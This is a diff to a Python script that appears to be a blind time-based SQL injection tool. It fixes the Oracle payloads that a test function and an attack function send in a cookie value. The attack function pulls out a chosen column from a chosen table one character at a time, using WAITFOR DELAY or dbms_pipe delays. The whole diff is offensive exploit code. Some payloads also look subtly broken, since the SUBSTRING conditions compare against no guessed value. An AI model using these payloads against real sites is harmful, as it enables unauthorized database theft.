@@ -27,7 +27,7 @@ def test(url, cookie_name, timeout=15):
         elif database == 'MSSQL':
             payload = '\'%3B IF (1=1) WAITFOR DELAY \'0:0:10\''
         elif database == 'Oracle':
-            payload = '\'%3B SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual'
+            payload = '\' AND (SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual) = 1'
 
         response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)
 
@@ -54,7 +54,7 @@ def attack(url, cookie_name, database, attribute, table, condition_attribute, co
             elif database == 'MSSQL':
                 payload = f'\'%3B IF (SUBSTRING((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1)) WAITFOR DELAY \'0:0:10\''
             elif database == 'Oracle':
-                payload = f'\'%3B SELECT CASE WHEN (SUBSTR((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1)) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual'
+                payload = f'\' AND (SELECT CASE WHEN (SUBSTR((SELECT {attribute} FROM {table} WHERE {condition_attribute} = \'{condition_value}\'), {index}, 1)) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual) = \'a\''
 
             response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)
 
